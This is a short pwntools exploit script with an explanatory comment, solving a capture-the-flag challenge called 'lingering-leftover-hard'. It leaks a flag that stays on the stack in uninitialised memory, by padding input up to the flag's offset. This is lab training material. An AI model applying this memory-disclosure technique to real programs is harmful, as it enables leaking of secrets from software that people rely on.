from pwn import *

'''
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  verify_flag();
  challenge();
  puts("### Goodbye!");
  return 0;
}

1. call verify_flag() then challenge()
2. In verify_flag(), the flag is read into stack, which stack space (rbp - 150)
3. In challenge(), don't clean up the stack, so when we read() into buffer, the flag still at that,
   NOTE: challenge stack space include verify_flag's.
   and the print("%.445s") make us can not leak canary directly, cause offset between buffer and canary is 456 > 445
4. Luckily, the offset between buffer and verify_flag's flag is 196 < 445. so we can directly leak the flag.
'''

context.binary = elf = ELF('/challenge/lingering-leftover-hard', checksec=False)

verify_flag_offset = 0x150 - 0x44
challenge_buffer_offset = 0x1d0
flag_buffer_offset = challenge_buffer_offset - verify_flag_offset
print(f'[+] the offset between flag and buffer in challenge is: {flag_buffer_offset}:{hex(flag_buffer_offset)}')

io = elf.process()

io.sendline(str(flag_buffer_offset).encode())

io.sendline(b'A' * flag_buffer_offset)

io.recvuntil(b'A' * flag_buffer_offset)

flag = io.recvline().strip().decode()

print(flag)

io.close()
